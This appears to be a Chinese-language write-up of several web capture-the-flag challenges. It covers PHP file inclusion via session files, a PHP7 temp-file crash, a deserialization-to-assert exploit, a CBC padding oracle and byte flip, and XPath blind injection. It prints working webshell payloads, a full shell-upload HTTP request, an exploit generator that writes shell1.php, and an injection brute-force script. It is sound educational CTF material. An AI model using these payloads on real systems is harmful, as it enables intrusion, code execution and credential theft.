## 查源码
猜测用js代码禁用了鼠标右键，chrome插件disable js就好了。

## 超简单的php
考点：

1. php文件包含
2. payload长度限制的绕过

简单的看了下/index.bak.php?action=message.php显然有文件包含漏洞，拿到所有源码。

主要的问题出在msg.php上面。
```php 
<?php
header('content-type:application/json');
session_start();
function safe($msg)
{
    if (strlen($msg) > 17) {
        return "msg is too loooong!";
    } else {
        return preg_replace("/php/", "?", $msg);
    }
}

if (!isset($_SESSION['msg']) & empty($_SESSION['msg'])) $_SESSION['msg'] = array();

if (isset($_POST['msg'])) {

    array_push($_SESSION['msg'], ['msg' => safe($_POST['msg']), 'time' => date('Y-m-d H:i:s', time())]);
    echo json_encode(array(['msg' => safe($_POST['msg']), 'time' => date('Y-m-d H:i:s', time())]));
    exit();
}
if (!empty($_SESSION['msg'])) {
    echo json_encode($_SESSION['msg']);
} else {
    echo "还不快去留言！";
}
```

简单地分析下，safe函数一个是对输入长度做了限制，一个是过滤了php的关键词。然后这题还开了session，并且session可控，并且通过phpinfo告诉了我们session存储在默认位置（/tmp/sess_id）,看到这里很明显是包含session文件。

这里我主要用了两个trick，第一个是数组绕过长度17的限制，第二个就是用php://filter/convert.base64decode/resource=协议读base64内容的方式，从php反序列的字符串中逃逸出我们传入的webshell。

这里需要注意base64解码的时候是4个字节一组的，需要在base64串插入写字符串，使码前后都能被成功解码。

```
123PD9waHAgZWNobyBtZDUoMSk7QGV2YWwoJF9QT1NUWzFdKTs/Pi8v1
```
我这里就是前面填了3个字符，后面跟了一个，如果懒得算，自己fuzz下测也很快。

然后msg[]=123PD9waHAgZWNobyBtZDUoMSk7QGV2YWwoJF9QT1NUWzFdKTs/Pi8v1

include即可，找根目录下的flag。


## ezinclude
考点：

1. hash长度攻击（雾）
2. php7 程序崩溃后包含临时文件

其实第一步，直接随便输入一个用户名然后把更新的cookie作为密码就可以过了。

第二步，这里有个404跳转，抓个包或者禁用js就好了（flflflflag.php），然后用dirsearch扫一下，发现了个dir.php，是枚举tmp目录下的文件的，猜测和这点有关。

参考这篇文章 https://www.anquanke.com/post/id/183046

发现php://filter/string.strip_tags/resource在文件包含处使用会导致php崩溃，从而留下临时文件，如果我们能同时上传一个webshell句解决问题了。

```
GET /flflflflag.php?file=php://filter/string.strip_tags/resource=index.php HTTP/1.1
Host: your host
Content-Length: 218
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryg0YFRf1GjnhWWlch
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7
Connection: close

------WebKitFormBoundaryg0YFRf1GjnhWWlch
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: text/php

<?php echo md5(1);@eval($_POST[1]);?>
------WebKitFormBoundaryg0YFRf1GjnhWWlch--
```

之后就是常规的操作拿shell了，phpinfo和根目录下都看下就好了。



## ReadlezPHP
考点：

1. php反序列化
2. php7代码执行

首先直接看源码
```html
<a href="./time.php?source"></a>
```

访问拿到源码

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

很明显的反序列化，关键是\$b变量需要传入一个回调函数的名字，并且这个函数能够接受一个参数。

尝试了下shell_exec等命令执行函数，和别的容器一样估计都上了disable_function。

能代码执行的剩下了eval和assert，我们知道eval在无法动态调用的，assert在php7的高版本下似乎也是不行的。但这里环境时可以的。

测试代码


```php
<?php
$b='assert';
$a='var_dump(scandir("/"));';
$b($a);
?>
```

php7.021下的结果
![image.png](https://i.loli.net/2020/04/23/sMfHbNvo7UAVeaI.png)

php7.1下的结果
![image.png](https://i.loli.net/2020/04/23/pwoGVkR1nJFtaHf.png)

而题目是PHP/7.0.33（X-Powered-By: PHP/7.0.33）

我们试一下。
```php
<?php
class HelloPhp
{
    public $a;
    public $b;
    public function __construct()
    {
        $this->a = "file_put_contents('/var/www/html/shell1.php','<?php echo md5(1);@eval(\$_POST[\'whd\']);?>');";
        $this->b = "assert";
    }
    public function __destruct()
    {
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}

echo urlencode(serialize(new HelloPhp));
```

![image.png](https://i.loli.net/2020/04/23/eLUEOZJtdAQopvg.png)
成了，我们看一下，访问shell1.php，发现一串md5，执行phpinfo后可以找到flag。

ps：其实这里我一开始是以为两个flag都是假的，就上了antsword bypass disable funcation，想弹个shell，结果发现是phpinfo里那个，，，那其实phpinfo(-1)就好了，，，，

## web🐕
考点
1. cbc padding oracle
2. cbc 字节翻转

``` php
<?php 
error_reporting(0);
include('config.php');   # $key,$flag
define("METHOD", "aes-128-cbc");  //定义加密方式
define("SECRET_KEY", $key);    //定义密钥
define("IV","6666666666666666");    //定义初始向量 16个6
define("BR",'<br>');
if(!isset($_GET['source']))header('location:./index.php?source=1');


#var_dump($GLOBALS);   //听说你想看这个？
function aes_encrypt($iv,$data)
{
    echo "--------encrypt---------".BR;
    echo 'IV:'.$iv.BR;
    return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;
}
function aes_decrypt($iv,$data)
{
    return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die('False');
}
if($_GET['method']=='encrypt')
{
    $iv = IV;
    $data = $flag;    
    echo aes_encrypt($iv,$data);
} else if($_GET['method']=="decrypt")
{
    $iv = @$_POST['iv'];
    $data = @$_POST['data'];
    echo aes_decrypt($iv,$data);
}
echo "我摊牌了，就是懒得写前端".BR;

if($_GET['source']==1)highlight_file(__FILE__);
?>
```

观察程序发现128位的cbc，blocksize是16字节，加密IV已知，secret未知，我们还知道解密是否成功，密文，我们又可以控制密文和解密的IV，可以使用padding oracle爆出明文。

理论的话看下这篇文章。https://www.freebuf.com/articles/web/15504.html

简单地来说就是根据cbc在iv padding正确的情况下的返回值和padding错误下的返回值是不一样的，我们可以利用这个特性逐位还原密文。

然后我用找的脚本改了下
https://github.com/mpgn/Padding-oracle-attack.git

爆破出明文
FlagIsHere.php
```php
<?php 
#error_reporting(0);
include('config.php');    //$fl4g
define("METHOD", "aes-128-cbc");
define("SECRET_KEY", "6666666");
session_start();

function get_iv(){    //生成随机初始向量IV
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}

$lalala = 'piapiapiapia';

if(!isset($_SESSION['Identity'])){
    $_SESSION['iv'] = get_iv();

    $_SESSION['Identity'] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION['iv']));
}
echo base64_encode($_SESSION['iv'])."<br>";

if(isset($_POST['iv'])){
    $tmp_id = openssl_decrypt(base64_decode($_SESSION['Identity']), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST['iv']));
    echo $tmp_id."<br>";
    if($tmp_id ==='weber')die($fl4g);
}

highlight_file(__FILE__);
?>
```
很明显的字节翻转

很明确就是要把piapiapiapia翻转成weber。

由于php的openssl raw是pk7填充也就是填充16字节，所以piapiapiapia在一开始会被填充为piapiapiapia\0x04\0x04\0x04\0x04，我们需要翻转为weber\0x0B*11。

核心代码是这个
```python
target='piapiapia'+chr(4)*4
if i < len(target):
        evil_IVList[i] = sourceStrList[i] ^ old_IVList[i] ^ ord(target[i])
    else:
        evil_IVList[i] = sourceStrList[i] ^ old_IVList[i] ^ 0x0B
```

最后拿到HelloWorld.class，把里面东西放到python里的bytearray得到flag。



## ezlogin

考点：
1. xpath注入
2. 简单的文件包含绕过

xpath注入和sql注入很像，就是语法有点区别，大家可以参考菜鸟的xpath教程，这里主要提一下，string这个函数能把节点也转为字符串，name能读出节点的名字。

xpath注入主要有两种，一种是普通的注入，另外一种是布尔注入。普通注入对标union注入，使用|来完成和union类似的功能，例如1%27]|/\*/\*|//\*[%27，可以枚举出节点中所有的内容，但这个题用不了。布尔注入对标布尔盲注。

fuzz后发现，成功会显示非法操作，失败是用户或者密码错误。
![image.png](https://i.loli.net/2020/04/23/f5zPNR9UWohvcl3.png)

依次探测/\* 根节点下属节点的数目，/\*[1]/\*，根目录下子节点的下属节点数目依次类推，最后发现
```xpath
string(/*[1]/*[1]/*[2]/*[3]) //密码，找根目录下第一个节点的第二项的第三个节点的值
```

```xpath
string(/*[1]/*[1]/*[2]/*[2]) //用户名
```

写脚本爆破

```python
import requests
import string
import time
import re
session = requests.session()
base_url = 'you_address'
success = '??'
payload = "' or substring({target},{index},1)='{char}' or '"

chars = string.ascii_letters+string.digits


def get_csrf():
    res = session.get(base_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',
                                         'Cookie': 'PHPSESSID=8ad6c1a25ba4ac37acaf92d08f6dc993'}).text
    return re.findall('<input.*value="(.*?)"./>', res)[0]


target = 'string(/*[1]/*[1]/*[2]/*[3])'
# username adm1n
# password cf7414b5bdb2e65ee43083f4ddbc4d9f
data = '<username>{username}</username><password>1</password><token>{token}</token>'

result = 'cf7414b5bdb2e65ee43'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',
           'Content-Type': 'application/xml',
           'Cookie': 'PHPSESSID=8ad6c1a25ba4ac37acaf92d08f6dc993'}
for i in range(20, 35):
    for j in chars:
        time.sleep(0.2)
        temp_payload = payload.format(target=target, index=str(i), char=j)

        token = get_csrf()

        temp_data = data.format(username=temp_payload, token=token)
        res = session.post(url=base_url+'login.php',
                           data=temp_data, headers=headers)
        # print(temp_data)
        # print(res.text)
        # print(len(res.text))
        if len(res.text) == 5:
            result += j
            break
    print(result)
```

查md5值，然后登陆后台，发现有个有过滤的文件包含，可以用大小写直接过读/flag。

phP://filter/convert.bAse64-encode/resource=/flag

## 总结
其实不少题目分析下来还不太难，不过文件包含的思路倒是学了不少。打成这个样子，一方面是题做得少（下回要多扫几眼比赛的wp）,一方面是写脚本的速度太慢了，最后考虑下有空看下二进制？
